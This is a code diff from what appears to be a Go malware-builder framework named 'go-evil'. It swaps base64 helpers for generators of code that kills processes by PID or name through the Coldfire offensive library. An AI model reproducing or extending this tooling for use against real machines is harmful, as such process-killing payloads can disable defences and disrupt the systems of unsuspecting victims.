@@ -1,4 +1,4 @@
-package base64
+package system
 
 import (
 	"fmt"
@@ -6,21 +6,22 @@ import (
 	"github.com/TeamPhoneix/go-evil/utility/structure"
 )
 
-//
-//
-// Encodes the provided string and places the result in a runtime variable
-//
-//
-func encode(value string, s_json string) ([]string, string) {
+// Tries to terminate a process based on it's pid
+// Input must therefore be the pid to utilize
+func kill_process_id(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
-	function_call := "base64_encode"
+	function_call := "kill_process_id"
 
 	data_object.Add_go_function([]string{
 		fmt.Sprintf("func %s(repr_1 []int){", function_call),
-		"value1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
-		"spine.variable.set(coldfire.B64E(value1))",
+		"value1 := tools.String_to_int(spine.variable.get(spine.alpha.construct_string(repr_1)))",
+		"err := coldfire.PkillPid(value1)",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"}",
 		"}"})
 
+	data_object.Add_go_import("github.com/TeamPhoneix/go-evil/utility/tools")
 	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
 
 	parameter_1 := data_object.Generate_int_array_parameter(value)
@@ -28,19 +29,19 @@ func encode(value string, s_json string) ([]string, string) {
 	return []string{fmt.Sprintf("%s(%s)", function_call, parameter_1)}, structure.Send(data_object)
 }
 
-//
-//
-// Decodes the provided string and places the result in a runtime variable
-//
-//
-func decode(value string, s_json string) ([]string, string) {
+// Tries to terminate a process based on it's name
+// Input must therefore be the name to utilize
+func kill_process_name(value string, s_json string) ([]string, string) {
 	data_object := structure.Receive(s_json)
-	function_call := "base64_decode"
+	function_call := "kill_process_name"
 
 	data_object.Add_go_function([]string{
 		fmt.Sprintf("func %s(repr_1 []int){", function_call),
 		"value1 := spine.variable.get(spine.alpha.construct_string(repr_1))",
-		"spine.variable.set(coldfire.B64D(value1))",
+		"err := coldfire.PkillName(value1)",
+		"if err != nil{",
+		"spine.log(err.Error())",
+		"}",
 		"}"})
 
 	data_object.Add_go_import("github.com/redcode-labs/Coldfire")
